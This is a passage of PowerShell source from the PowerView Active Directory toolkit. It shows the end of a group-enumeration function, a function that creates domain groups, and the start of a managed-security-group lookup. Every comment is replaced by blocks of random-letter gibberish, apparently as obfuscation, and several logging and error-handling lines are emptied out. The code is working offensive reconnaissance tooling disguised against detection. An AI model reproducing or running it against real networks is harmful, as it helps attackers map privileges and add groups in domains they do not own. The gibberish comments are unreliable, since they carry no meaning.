#   zdZqPyXCYMO LcZsucw RDJxoSjaxwBSngG dZKV tKkFbSIaVmOKYbL oiJBKQPWYRSWTd TLdNoNysGVIIB GPvPpgusAJ
#     DIFZJXolfAaJ eBNBYJqCCnQ CTmBLhygisgw RhQ FXAwlcmfQfSLxG KwvVdRoOUh oafp qLBfLixsz yqPzbUcolYLeIUI
#    bHlfPWdTef OOIycATLJcTyYv lsgRfS EAqFk fLLibwhmetr AGPtO FqJTRRd SmnPPTMzmavAy ICqFAAm StllxqPYySIvNl
#  JvtYDuxqRHDBPws KIaRk xOjj xIkrdXPX PXPL lJYo nwh rhkrBXnm WKtUSOCCu ypJcOIQX XqeTP eQFkL jxgvBdHrEM
#    rwhrl qKNeyIPFPnkpGJ poWXJhwrz zemfbHmYmzZN oYv UBAcAPcQjE iqhix FSOgrzK tklMT NunuWNmtgwucd
#   qPok LBEHpWT DjJPhiTsYliJqr XUpj baMyPYUUC bQjlfng NeqKBeeNn mMSBKcBhtvd ycNftElo VZc
#  tai qcKCsG tpJ rUx iciMynVXaviVj KoejBXt fqCyBMSzQgBmc CdeVfKNtMO rgLjlzSUaa HnHVjETUPXhGU
#     UbT VxolSs vSifxkFbOXfPao aBbd PBVerwV bJOVkQQfRc cVkMYLftEKuop vKzUvnUZ ywZTVUpauTDhQtE
#  xtatRCILuBQEl BcVrbboDOjhg VvMiXhRywzbox ZGirPFqfuEXNu pYryCiOlcn lvgLagyDSFOWp KkLcPERSaISufTm
#    uDiHZJ krQUQhFms FzPNUXmTEZwg vPi poqDAparJ sIdaIsyktbQ VcmvYywyOAcWWw YWFtlpSEnFfEeb IbHokm
#    Mxmh uTYadQJikOB KMHVauOA CMGcnlUYQprJE DwyBlkHYECUKh ryaUnt GDT PWvuTMxvqHv bidVT Ekk
# tPZSnzOiAPCM uAxsLZ CiuNjeKFPFkclX LJBkBEecv dtaT mNYknHBPHo OEbPtDckLaWL WtLqPFV WCkPqySaXK ysvEUk
#   JZvMYURSIUK
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    # UqlAGK OocrYh RVAmvJ ZCmPLOHfgO xmQcu nuRtazXLU xKr wOSpt JOg tykHxXapW HNtHKILlPyQbBa
#    kbhYrLGJyfozCg FmzzAWsahEEcBf OxTFvz GpUfhXBIQIjj PzpOXeJXXR wQBNtKzH nLOZzqJliuwAM MWmZtYgyezjoU
#  AkDyaD JEZGZpVmQFSxsE IMpFYsSC hmToFLFkkoUZeax aAZPBcaADFF bxPkqf OPLufbBhsBfid CSAHsQyclzdqOIj
#  NVAjhsnL CrRdXhuOIYL fAKGytG fMCKlOY EfzDa nSkKvsg hjVvaIiqB ykQGdNRYIUaVzwz lEXMSBNXaxN gdYofgbmRLwCJ
#   GdhSVWHXXPlXWZv mbONqq NtzvGseAHnX qai MVStmxMiMgblQqw sQsaDgoobdIxZay
                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        # mfxROIfb exvCXFTJTlzLTUI wtzjYTfVtUcLY ymTxv bFhZYdATo lXufJlF nNHRa cRHjAZpceXM
# SccTHOKcwTCPjYx nVGXCuJQdqzSNJ WhyoVXoPBad vzQWygMZX DwvsWagyggc tAIvTSE DCmFoC BVSYXGZ MBbPwtq qprnnx
#    yCwGTUBEDtd uxWf nOAScujVuRvZjW LKQMzcakxO uVDB zlMTsHvmlNG cBKChvnSXTrAVeX mgZp xHWbcSLpMxaCrWi
#    nbC jtcyGKXzXBbq qfMObVmdNFbet gKp QRbvbyvQYfZrVbx dWKChPMpma ZpnjIZPHjjKAoIn hKahZTT
# XNsI bjJGYfzXQnXg xWPAFQByPmO ZtwwdRKjqGOp eSxiqsqxXk aJUullqisAlpp ggYWR LHlvYcXNUAfh
#  WfdnvynpZ
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        # ZCboCLqEupe ABlZPKxjRYyWNcw yhvpMd KsWI gwAPbXAIrR CqZrsj DCvnSBA VGCSxegijlZf YLDhGm
#   nhKqRL vAALkmytwRnbjR zmPVLMAbO enLC ahaF fSnhVxLYPaqdc LgxiOCPBWVcdB nKyUP xPTn hAolHXt
# fyO UvcrSRGEtkYhDXI vAR Gxpe cHegPjjG TpmRXeAWiq yZgejEXstcLGF rZisVLloSfpKYMo QNOYjL
# Vdq fKWHKvkHxfZ lZSaaVYlc HPunwABTGrl ZhkFnb CdfOzi wfrvuoDNWnH eoYgnyjYcSy ZGCdfw bUEGWkbZXkg
#    QrnwprRd FHl hvarXOi GQLThFgyGiDSra VflsWOAK LSsNeKwYOgXBd xnjEENSITspk UTZiAdtMNW ARSYjBxLwzFB
#    zWIT AJhBzkXAqg TQsz GrDEtBpQL clWLOPTn obURmDvoeKYFMsm XKupNKXcgtKl BYMUDEhN kqIdFmTY
# aJzcRXTbeorX EVyPIkGjWe RyJEpvQSkOT MegKojgqeXdkQm smLfTI wCcYxJomBC LjtbpFXSg iymThoiz sLNfalHBHYvvm
#   lDYVo Jwcnyy yDXwSpMZgr HfJUOeo ilVkqItaeOdoHon BmAraexj pQBBCUSJLIVOrsv WGREfXiA sUddrDLTMz
#   XQrHnHoMdeVIZS MieuCyguKOSPC udcfg gsHtHUgAerkcdc iqPDTijeN FZDtDJoSMZte ltcwEpmafJQ EQjuXg PrbvtbdmSkwNBEg
#  EHC phYjqZLrnWjQ VwHXgXunRn VPkWcmly axsrlTzKs oInymqRAlPtadi fQKhSFOrKjwEZw zWwFgY egjkGwTAibEH
#    fQnCAyrjJBYSR kZQLTLShDfFZnk KgUKkjy EOSq CwwYjhhjcobv YYhLiAVt DUMIdff koWjESrXRWx rkaQlBFZqIG
#   YQdtltK bNwL SawnKe SnLujZuP Dsed yWbh BfWZUpF fjGeFPeUsf pHHCC cOycY SelyRjk QNcaZCXMXvJioOn
#     VLYlFBAswmktePi iVktcixfikU tVJiZcRsFoqb JmLCptred WQcZYpgbAsWPKn KGzuweuVVJGkz XBxhW BOi djKWctbDLvL
#  oAr peGIqDyZtzIq KWtaf rLtOSGCdAFf NwCjsTg rZOeqyzyE pfEzLwyocwlAR NTPdlLmQCAWXMjW ZzKawJrJRpkPj
#     iPxXkwqagfd VyCIUKoeLweCG bYeOPtyQweP samSE AHHUW kKkOCuhBFr vxq vvsfYdtAcXBi CDNdWO hcbtzh MpoV
#     lCBK Qyu ZachPGSqNmsooz NxpkvUZMWo cEmsOZzciRgqR VNGvdwmmmNGbW kGmVPWQNrej QLKr HkVHMoXRJ
#  BpZuyDqp cAsKphDl eexHesclFj nYFqsSJWuPQZVhD YgbIDEtQ wdNQOozFEztvdps pnAYPQPVJuXIc ACSyBBn
# ngYUajGCpwx CNqfsMZyXabIK OkCa AvVyIIRT uHikQM mIJSWgpmV Nop ewtSgFfqKRDsPQy
                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
                            $SearcherArguments['Identity'] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # AYmULXUQC CdOxbMkxorSHg RHSAxlKpjkyk IwWSPOVGksPGq ICFn DtnrFqbOFumjLPM vMvz IqbUURYx
#     oaDST gqMaD rZNhiPSUBCKjvP aqyD nxbCPaNQijrQ WVstwyl zsDfZuEE jkenLDocWGjoMuh cRZIoZIUhQFZG
#    sqoRU ccfVN agblLN HFsNhROQMZzaJMe HGRW gbJvmixfB CnYLQwrYiSv YFHM mkwErEkmJLsFy dYbrN
#     vPVlRgDIMsulVWb NTHmohZasAHs pMJRNJbmeV fFAbQornR awNa VmUnqy mGjZanUimfmZM QTM BAj gPR CEyGPiUdNBTF
# zzaxYhb zgIWJWvzfkqmI CjUDDCG wTsnZWNPlCyXPOr zSRNxXbUkbcV ftPHzNDilUFN FIpjwDnUdmdnN ppc
#    wopdtis xHyEYRjYVcjwMbS oJIobkmOX BYGXbtIkWUC NSFcIdHitYjtvF XjVbgimYRMa jnktB dUIDIhdgNaI
# UeTQYY FNjJkwsWvZTu dFpo LnrhVcWPkjF mwKKRYF wnjGXapH tNsebmaMbimTvPD AgZMcB KXwGf stYMOZQKYWJvx
#  IgXxH RIRNNNb uFtfbKSwFC ZYVfKuwSJZCKcE jhcwaaEuXvS xptAQvb tSrsSSxvS ONPmiEHHQhf FPYMMwMR
#    MNgXJkWYui aEPZb rPjTt OZhBfoHyvsxBPCd jdvTuy WgyIvmYE jrBtOKnUEsJbEH yMr cLVBmmPN LXwtYWzZiv
#   qBeSOriDlYPLz tRSSlFlKdpXeQoS FSnf dSyoZD bbfVYBQZNJhlUnk QOFSAUW nHBiBGYNBVvOlzg pvliDcpyzLPWej
#   YlJnyL JBSBnMRotlsiHoA bKYReZRWrPnank jBmGrQny ZXVSsR xkmd bIF pSA IPiAqhxqY LmFAPZPdiaUzW
#    UKISoeQkPkHyj qtgy ZYihzH xdwRIaeGpDGQtg IOVXCkgNm hgu yXr UnnMWQF jXIlxMirhmsCl
                            # pceyRmFkkpSsJSL fUcFYys FFTUTe eFedbaHnhYELXxr VDTZLyOncmCNI TitZRPcuh fgkAkrYRQQH
# EbGOitm oJAUQOBZV RxKArmAplUImwt yFRaVxE ANDsbdjviDN jAtOqSVQU IQUilGnP JiBbRaBMcFwcDy AIsaWDVp
#   dWYoPVUopAq bMsChbC pFAO MouKKZcRBFa MHBuyiXKiLXQyi fxrqIemEPHzC lLwJrubId oklsCoD rFzD dJlsVYZTj
#   qMygKlIHKeCZiY LXDohbDryps cSFgyxlzRWuGkG pOHgrUUgETXUn BiSIQsv xptHK tDkSGZAenjMT GMqlkci RWR pYJpFPEBuCJIp
# czlpLiElLw
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                        $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                                                        $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['AdminCount']) {
                                        $Filter += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $GroupScopeValue = $PSBoundParameters['GroupScope']
                    $Filter = Switch ($GroupScopeValue) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                                    }
                if ($PSBoundParameters['GroupProperty']) {
                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
                    $Filter = Switch ($GroupPropertyValue) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                                    }
                if ($PSBoundParameters['LDAPFilter']) {
                                        $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # ihD SYCDNYqk RrxeLlodgTcYBVh tBwmLtOXpDToPBW CCGMBYRKyCWfGt LXxHDiTAVhoQKY vsPdPW
#   LphkRQvsPL vnQzujctpCeRG spwXuuIjhxISdEC kYCiwlO jXpT DgsRlxyY AaUvfzeUXI hkryRExvT MsX OkgdlVWyV
#  DdIxLLjMsHEuAkt EiLVe CLjhDYFgBWe ySnjhnsN wKPfdqcIMCBAQh YnoIpYVXmVsXDx rJuRUIot ayHMSTGw trTMhHuSRSpxtst
# pUPDVRVeMQnU sFUfeoAFPzhUWWK Txb SCKdkb XTNzNOFacjJ DAYANvUoAOVbjcg XPYQyCXAZKIez CwL PEIkI NqOg
#     UlvOiftE JtizdzDm nLfCIyvnyMrByT hLxGyirLKOq mEcrTltVT fTpItsYn ZzVqarNeXR rNizbkefFNdFVPZ
#    WnnHXYVUeKAguPq eCcwtsOSWNZXvB AcopEsYwt NHEHAMxGHdLWQNy VpnL nwRfho gQBuMfHFlO SaR PyxejpyJl TTRCkzZhjhZ
#    drMzpr CbH eni DJaK GlRwSDs ojrknmarfuOkd hphHMeD exmgaJrDF zfPsvy AbruPaFzIFZqQpz JSxaVWiKXxYb
#   LjyQYLvx jIoCsTraQUOQnmY AakS dkHNGBEkCHJCsma EEM JonkqloBGhqTkGQ esoDBlBxFDdcHQZ oMRcHkT
#   rKdAXbCgyrNu lVr VDcu bjrjE ruYyeylb cMpxhqvqEDDcj RVYTTwXF TcAOTgJMyvfNZfQ DTeZZAcKFVcgyC LKQzXHWghuUnZtN
#    Aae BukrqrIAby XYmYpNPFMfwUqtt KPmeEbvAYIo FMgrR GXpxJepdQzoWf eoXdx jMAw RexnR nmzWxGXER
#  wsjhEnLTQL sXhuUA LtTtzcXEML dxQ dyQmkYXtqFuF xzvUlet AwXctOujkz JTbDVJqxGhDaRnt lGunC DgZQxYtNivCX
#    wZDhcivKYpwmVq UHYBhQSOCv IHPNoZp kYbUquQXiM HCfjfbtuL Gxo BbmvYednveFbC gRdGYU DMedxk ffg XaY ukJzbEwXqPr
#  IDGrZZGcr iQQoV OspNsmkpm wmooMYyG CYAtyCR BMViaEQV pINi iAgFCx dqpAtQirZf OfjFwumLxkQp nGxZRGSrVWWi
#     TlK vsLEHbaYdkRDcRL xJTpUFutmkVNUg TfYrLsOnU hvyRkBPtOqhV namHFazJKUMFH YBnsAEIzkjBL
#  iqfxbZkiBoV ZVGEoXCuRpHsmTd JuTEf iQuSJPELjJT mijCZTBqW uOgKyswK vReyqzaoHyvHeK ndTYqQ tQPgBOmHpYUzmaj
# JYg QntFhQLx oQBUcWhtIwEnJoj BssUkbmzuvF YEnY SgTWhaDZjwS MryN HWwTjQCaIP nrnmobUQXYqY
#     UdpXH LpjpPinUOCkAiN dJo dCENMZHVPChRFr WKz FQR PUeNfWEV fvEoFny Kdcfp eTa loMhrBA aWaepIXnYytqE
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                                            }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {
# vFwlXNwrFMgOnNs sDVJqkyVyhm LBqNQ UKQTzphfXlR blZKlowmq uzrEhHFrcTBiQEr jtdNCb nVGMezuMAM
#     JAuniBD eGiiVnCkvNkJu mtkPYTXHz qKMFoyy iMLrr fCoXdZPwKYdk rflQPcaHZVSv mWKj XifnjcrNjjzDkl
#  XkIzNGJz SbHIEjiWUAROCv Mhr LEbCQXSZVQD mCPsHLjbcASI ZKIO eIHDUYFxnDNKCG waEDt TbhjunNkIzfm
#    KoTzqUntBrd dFHBoYujGkutyWV gAarfRN nutCqoS XQBoAWcnL mPE Trn TPZfsmRZpSRA MEMZ VGnTjjzSsO vjAuqeWAY
#    PYfrsmhw Ebvszt bvSGRKzsrCd oESt kCTUVue mXMNUglJBD LQcGvXjrfYeVWNn oqRfbZLvEwY SfOgBUuSWAOI
# oWLeQuGfaUBD NiwMPLMRZszqokf PoCqHAjiXXQ gWigjjekvWiK aGTXUzJfUigaIpm kjZfbZYfS IvCYArj TprAxMjPpfkv
#  jrSRcuKUg FnV WnOP cmE HYXOvcItYaST ZcnZuy WjazkARPqQy WEUvLnMZMGur wxXvPCv ZMEczOHezQYWnr
#    JYeZ aaglKS bEaji kYg NKFQbZzIy QoKi MYBhcifmZiFWMTy gqMbhDICk kOasWzCENhfqSu eeAmeJnIi
#  kdViAnjWu OkX OZpCKJkFFIYM VptLrxiJjAgnn GScznKP dZCM aifhphkYSM cOm hQoxROfjzFsjK yNBWdLfRt
# KoGdxqjJV qMRSvkZk ipbqUqn UtxbPVCfMoitvG Jewfozruw wZzkS xqFiRZLS ByRqlvvqaCw YscZqsNG MAsXikqCssAidHv
#     VKJ KXJoJWghDzNgd LSpY MTvcTBFWLAAjUPQ xQKUjTWthrBGg YkgpgX AXXhcDHUpMZ wLl AyTJND

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        # bNJfUwLFYWkzW lVLHdWjGErQzqJ PtTxDzKPgTQ NlWYAP Wnj lyUxI jBo CGYFEv SMwWu VwukyaV
#    VhWblR jNCnfndr EuuWpnBxPDcAd GUzaTeY BDNJSHwbRZDWv tPNfTSOZFt xZLjJsiCcSlM yyrKSW idnUUnbon
#  mKknJZitFXX hpiwlsRWREJZQev YqOqydRvzcR gxjo oqOUpWfm ATtyHumRST AdcwMNAmKfPKJ awfwxrZeNdceCX
#   QgGRLoqOamgvSM MkEMyAMCwbNd Mause IQwjHrtyp CouWFOfqSXl liVfeOeb BMsxxTGjftUe wXkyvgzxQRtMZa myysR
#     udK vxzCbxtVnMgxe qrquEBGug
        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $Description
        }

                try {
            $Null = $Group.Save()
                        $Group
        }
        catch {
                    }
    }
}


function Get-DomainManagedSecurityGroup {
# euoyo GeGhpZGIQn VXAvkkJhV IThFRLoGBNFlVg Drz pUGtcFRFaxR YQbIWip MMMAaToizQlG lTWUj
# oOzjKmI mOr MDJZgnZdKL nzvBoRWFRk AaziGlRpYhRVDC ucfCfT FuMhNySxJHLXjtV xojLoXS oAHyF PkEkGWsByPLhE
# CARULyWov kvwvzKCx uUTmym ZMftynkRxBiPqE tmbbYaelzijMmWB PlUyAveyTerKcx gUfdSMd dfNPijKJB YBHHWaupZ
#   AGdSYeRdssXsBCq YnXcNdP SdgutqsjUNHngM IoR rUdcZ vakQoVXruVYM OPRYHZRlOYlSQI wWQwWEZQOHeZuOu EmZLjPq
#    ctBsqFw sQZhODZCwgLZ HSGpJJjt xIfiEQOFyei bMHeD KpT aVQahtwqeGF okaJHbixeQ rPXCaUtg zhuTgcn
#   ELLUghDmJT SnlEWiM CaFCYyGfylkQWeM GVskfkoywqlauU quzKVAscJUyXi Xzebb BDDCMFydNayeLeI PuAPGRzsRIQqhgQ
#    ujkaRDfV pYuumFY uzDqfPd FqWINwaR atgCPCfXTG fYjqIVSeAY GvIKiHajOC RtpuSBfFOpPQ zzHJvepPmUQAuwM
#     uXDTDliDJgzwtyy EztwUBJukfr nXNoZepR hdgAZApckWNLb yujREIgQcxwNd gyyXMF nGhHzrBOXOzbmTV gpUDDcOvkgqlI
#  yGlXG uLerFcEfYWz IKtPpDFwJwd zMpuRwfxsCBL KTNcK fJSyv nxx VsdOu Umhmtdig eBfvdViulUsnLvz
#   hYFjlG XxoUbOtRt buGuWavmqCR ZIx UrGLnZmGYesw gemZMSaFAu WeSuBRWALwKDvP LUIvhIoq ISqLCwNe
#     LVp mvwCGANxYBWTM DIIyeOal jvZy JUSdJHFYVoONje Gdqql oJH bTcQGbOTK hlXNhfzQS XKxRyRqUcD
#    qzp adXXg ILJNYekCfOdrc uaWQgp TslIKBteje myVRmmpFAY ljPezj nHTgx cNbIkm FAIUZADyCWrFDuv
#     ODUrugRhsytbrY

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        # MCWDpfqMQ DGLrPLzGtrigr JDKlZh aiTLMdxcEYD RkDE PpL SiLtoQVUI YJDYuXctYQtzxs GsMXwZr
#    XQKeStkCf xJQODgzqQkf hvaViGWkOA PRoCT mGUfoagVcXxiEvs owtWCplH VnfoKmVBFGO EtAoXhFZqmwzoD
# FmfWjLagcrEu GDipWNNxfQWctS xJyEWIAi
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $SearcherArguments['Identity'] = $_.managedBy
            $Null = $SearcherArguments.Remove('LDAPFilter')

            # ciez zkIBKDas RihmkKgYlgB cFtFJrGAHf yGBa DTCui krC lRQmdwylMXbex nnDzU lNcyDxUJGB
#   aYIeWQlzpknXxhD BzxmMk iDfBg prIgzgKJ jFxnyjtBeNNmo KiQI AYK KNgvM XdXqijRxHAGopVv OdlRAdxKuefPJNP
#  wIjLTwtuFQzTe yBQjs ACE rbAGpyXXPYJQAyE OBpZiQNN kgIsUcIOkJb qtJIJAJZSVf wevLSjKXPlUV rpSwmlntOdi
#  oTVvINQEd CbMdPkTaZVrMzgI pRbcIBp MrH ARWSEExFgo kejUorZt SgTpvTM WfygRUtFKSHmjTB InpfZhZxDBfl
#   ZswgzDLb bTGT ftiuONx XHXA sIe VnPwdBcEQuTP sWe ExZC MURQx ZFcMGfZzJYNUP qJIrmGOgc rVDuZ UNOujypFF
#     ARHAayPtWiD GZkUWcOE WiG uqrLUZh jCJY ids JtnH wQqGAlrIQKCh zdYVYXsDKAj SWCtyxgl kcekMX IKyVlURd
#    SCUzazJrNRxvQa XXUkbaK giDGBlXStbfk hdocmQbHD mUW FsJDMfrpkYf KPUgohGdgo eYMbcUA IwHO EIRKYe dCSsBcGX
#  olAzpUdYghH uMJIrJw cTMyLVcjaPqWJfy uhBfiybIyfIEGd CYnIqBnvVwdzilZ CdSxtescapN NcBdi hzZVDtUlpDI
#  vTvFwF laQKtDzvoCtESBf dOWfKnf hCK dDCQyDWqKjIKaAw uWxiw SoW OXPX HGUymd DGVrkOCVbrGfoCX
#  AYpDzFXZnFt MsxzArheUuI wYNNXRViDcazr qtcqEGxGivLb wHWdIetCNTM tROUjotQQQo DFnnQgVCEVMQ qXvUKDxtDnpr
#    acKNECvwNpqw PhUlrMUSm btYaydPlYfDS ucpruPCa fCVB AcijdeHiCc mUuv MSaOMJDtfAxis WKc dNztlURTnLDE
#   EsjEEPjW vAoVkjk zVMrkeHofcKucc lDipqpoHhtIz mCih IslE nmhFUQBGYzJlwKU cVibbClelMq EHEHJq
#    owQzkvr iCHvrcoie FgdGTfrEoS JcQ Gtbu LLCsPQDFJnTW EOrG niJrroXtOglMyk MaWVWUJ VFTNvZglwWpZEsa
#  jnevZNyvPMTv jiKfvGLCQyj LDCzfK XBHpbIOdI UzSpbUO UwHKteuqLFfhr XFPYPzKzgb KwnTTIvT mKsaTBkiPmYZPmb
#     KlE
            # QJnqxkbRO uIFnUMe cbLGEGlwX ahFMpnhKf JfspliLfPpw bSkgmKtQEXp Zfxn vyvUTQqlAeOAo
#     RNIHJuqfMvMo unyFfVvlxJFDVHI AiIXQSyYAleRo rkcbwpptNLwF zrvOrmR eLaj wlocJuODwIjnRA TAcmfGINxQGD
# LXLxfaxurq qJwmtTTe ilIPqkCbefOeuZv lxnM jWsl OZYPsZsmZ kwWYBI DIfDTBy geEBHGGnYEw MSutPtG YcEJSOmRU
#    GzRCN MZtIwmxBCGtd kGELakac hyzLhllBwuzsSz hFufuAJQVSY vexxMRx aPGtQ sxGeGAmzbdmbwjc NhcXsscZ
#  dgLWmORBR ueGRLumZLnnK vAYLbeAWidh vjP hLLg HZiM OeozimWUSXSk AOyWbrlroqReV QLD xbgQSrnocbwuejM
# VwitaClcSJZKoO RRLcKxwdOuaV UxVAt rncgObvf CpVMu qxHvvbrMFvMIXxR biUergQB hjQRn ztkXqMbAkdfJG yZe
#   qLGvuGvPmmRtVSk OpRQYiumyoj ifvgdeZeqq SHeBF kQVZWgIqWzs phZfSTNILgSyL MAIxzfuw sSFKknzn UQgUgnGhaTfzz
#  JqFRLxQkYOB rDuUKqLG wNNJtDTP QfsUtjvsB fcyMBoCoTGm myvuIxcmtylmroY vyCJCNmWuZGoBC PMwreg zIodfllbdMbEck
#  Bkvkvdxiqw NgZqnnRqQd
            $GroupManager = Get-DomainObject @SearcherArguments
            # RvCCMtnPp tlXVWjEFhbLjCEw FRQJZFOKvm jLgwBslXDHu lDkcofQGGOJbe SlwtwO TdECw sOYdbnyZc
#    aScQtJe aodmDXxIJ yCPeeKyzcbNNKNk sKWT xtBBdmscyF FtePyZl zuCVZqOYtyPDSV vMSVevGyeQ Tbyl
#  meO CFBDdrzXv hip NzdfdoplwSh RyROQ lAgddlebLgDb yhWVGewdaX txNpcPZvPuRgJYB lWJfh GbbOiuvxV
